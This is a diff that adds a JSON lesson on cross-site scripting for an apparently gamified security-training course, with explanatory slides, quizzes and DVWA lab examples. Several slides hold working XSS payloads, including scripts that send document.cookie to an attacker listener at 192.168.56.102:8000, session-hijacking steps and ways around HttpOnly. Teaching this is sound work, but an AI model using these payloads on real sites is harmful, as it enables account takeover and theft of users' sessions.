@@ -1,0 +1,120 @@
+{
+    "id": "l4",
+    "chapterId": "ch_8",
+    "title": "Cross-Site Scripting (XSS) 🎭",
+    "description": "Inject client-side scripts to steal cookies and deface websites.",
+    "xpReward": 40,
+    "estimatedMinutes": 12,
+    "section": "Injection",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "What is XSS? 🧬",
+            "content": "# JavaScript Injection in the Browser\n\n**Cross-Site Scripting (XSS)** occurs when an attacker injects malicious JavaScript into a web page viewed by other users.\n\n**Analogy**: Imagine a public bulletin board. You post a note that says: *\"Free Cookies!\"* When someone reads the note, a hidden mechanism gives you their wallet. XSS is the digital equivalent.\n\n**The Goal:**\n- **Session Hijacking**: Steal the victim's cookies to impersonate them.\n- **Phishing**: Fake login prompts.\n- **Defacement**: Change the website's appearance.\n- **Keylogging**: Capture keystrokes.\n\n**The Payload**: Usually starts with `<script>alert('XSS')</script>` as a proof of concept."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "quiz",
+            "title": "XSS Definition 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "Who is the typical victim in a Cross-Site Scripting (XSS) attack?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The web server itself.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The database.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Another user of the web application.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The network firewall.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "XSS targets other users' browsers, not the server directly.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_3",
+            "type": "text",
+            "title": "Types of XSS 📊",
+            "content": "# Reflected, Stored, and DOM-Based\n\n**1. Reflected XSS (Non-Persistent)**\n- Malicious script is part of the **request** (e.g., URL parameter).\n- The server **reflects** it back in the response immediately.\n- **Attack Vector**: Phishing email with a crafted link.\n- **Example**: `search.php?q=<script>alert(1)</script>`\n\n**2. Stored XSS (Persistent)**\n- Malicious script is **saved** on the server (e.g., in a database).\n- Every user who views the infected page gets exploited.\n- **Attack Vector**: Posting a comment containing the script.\n- **Impact**: High (worms, mass cookie theft).\n\n**3. DOM-Based XSS**\n- The vulnerability exists in **client-side JavaScript**.\n- The server never sees the payload; the page's own script mishandles data from the URL hash (`#`) or `document.referrer`.\n- **Example**: `document.write(\"<h1>\" + location.hash.substring(1) + \"</h1>\");`"
+        },
+        {
+            "id": "s_l4_4",
+            "type": "text",
+            "title": "Finding XSS Vulnerabilities 🔍",
+            "content": "# Where to Inject\n\nLook for **any input field** that is reflected back on the page:\n- Search boxes\n- Comment forms\n- Profile fields (username, bio)\n- URL parameters\n- HTTP Headers (User-Agent, Referer)\n\n**Test Payloads:**\n1.  `<script>alert('XSS')</script>`\n2.  `\"><script>alert('XSS')</script>` (Break out of HTML attribute).\n3.  `<img src=x onerror=alert('XSS')>` (Bypass `<script>` filters).\n4.  `<body onload=alert('XSS')>`\n5.  `<svg/onload=alert('XSS')>`"
+        },
+        {
+            "id": "s_l4_5",
+            "type": "code",
+            "title": "Reflected XSS Example 🧪",
+            "content": "Testing a vulnerable search parameter on DVWA.",
+            "codeSnippet": "# URL: http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=test\n\n# Step 1: Inject basic script\nhttp://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>\n\n# Step 2: If blocked, try image payload\nhttp://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror=alert('XSS')>\n\n# Step 3: Steal cookie (requires attacker server)\nhttp://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=<script>fetch('http://192.168.56.102:8000/?cookie='+document.cookie)</script>",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_6",
+            "type": "text",
+            "title": "Stealing Cookies (Session Hijacking) 🍪",
+            "content": "# Turning XSS into Account Takeover\n\n**Step 1: Setup a listener on Kali**\n```bash\npython3 -m http.server 8000\n```\n\n**Step 2: Inject the payload (Stored XSS in a comment)**\n```html\n<script>new Image().src=\"http://192.168.56.102:8000/?c=\"+document.cookie;</script>\n```\n\n**Step 3: Wait for a victim to view the page.**\n**Step 4: Check your HTTP server logs.**\n```\n192.168.56.101 - - [19/Oct/2024 10:00:00] \"GET /?c=PHPSESSID=abc123 HTTP/1.1\" 200 -\n```\n\n**Step 5: Use the stolen cookie in your browser.**\n- Open Developer Tools (F12) -> Application -> Cookies.\n- Replace your session ID with the stolen one.\n- Refresh the page. You are now logged in as the victim!"
+        },
+        {
+            "id": "s_l4_7",
+            "type": "quiz",
+            "title": "XSS Types 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "multiple_choice",
+                "question": "Which type of XSS affects every user who visits a specific page without requiring them to click a link?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Reflected XSS",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Stored XSS",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "DOM-Based XSS",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Blind XSS",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Stored XSS is saved on the server and executed whenever the page is loaded.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_8",
+            "type": "tip",
+            "title": "Pro Tip: Bypassing HttpOnly 🚀",
+            "content": "## When You Can't Steal Cookies\n\nIf the session cookie is marked **HttpOnly**, JavaScript cannot read `document.cookie`.\n\n**Workarounds:**\n- **Perform actions on behalf of the user**: Use `fetch()` to make requests from the victim's browser (e.g., change their password, transfer money).\n- **Keylogging**: Capture everything they type.\n- **Phishing Overlay**: Create a fake login prompt using HTML/CSS."
+        }
+    ]
+}
